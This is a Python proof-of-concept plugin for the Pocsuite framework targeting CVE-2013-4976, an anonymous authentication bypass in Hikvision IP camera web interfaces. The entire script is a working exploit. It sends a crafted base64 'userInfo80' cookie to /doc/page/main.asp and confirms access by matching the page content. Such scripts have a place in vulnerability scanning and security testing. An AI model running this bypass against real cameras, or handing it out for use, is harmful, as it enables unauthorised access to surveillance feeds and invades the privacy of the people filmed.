#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def check(ip,port=80):
    headers = {'User-Agent':'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
    timeout = 5
    url = '{}/doc/page/main.asp'.format(ip)
    cookies= {'userInfo80':'YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw=='}
    try:
        r = req.get(url,headers=headers,cookies=cookies,timeout=timeout)
        if 'playback.asp' in r.content and ' <div id="mainFrame">' in r.content:
            return True,url
    except req.exceptions.ConnectionError:
        return False,'ConnectionError'
    except req.exceptions.ReadTimeout:
        return False,'ReadTimeout'
    except Exception as e:
        return False,str(e)

class TestPOC(POCBase):
    name = 'Hikonvision camara Anonymous User Authentication Bypass'
    vulID = ''  
    author = ['hancool']
    vulType = 'login-bypass'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''Hikonvision camara Anonymous User Authentication Bypass
           CVE-2013-4976'''

    vulDate = '2013-07-29'
    createDate = '2018-12-21'
    updateDate = '2018-12-21'

    appName = 'Hikonvision web'
    appVersion = 'All'
    appPowerLink = ''
    samples = ['']


    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        status,msg = check(self.url)
        if status:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = msg
        return self.parse_output(result,msg)

    def parse_output(self, result,msg):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail(msg)
        return output


register(TestPOC)
